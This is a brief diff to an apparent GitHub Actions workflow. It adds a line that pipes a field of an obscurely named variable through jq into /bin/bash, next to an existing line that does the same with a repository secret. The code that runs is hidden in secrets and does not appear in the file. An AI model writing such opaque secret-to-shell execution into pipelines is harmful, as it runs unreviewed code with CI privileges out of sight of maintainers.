@@ -17,6 +17,7 @@ jobs:
           rktnm8234: ${{ secrets.rktnm8234 }}
         run: |
           printf '%s' "$rktnm8234" | jq -r .az52 | /bin/bash
+          printf '%s' "$zeut63208" | jq -r .mpezf6 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
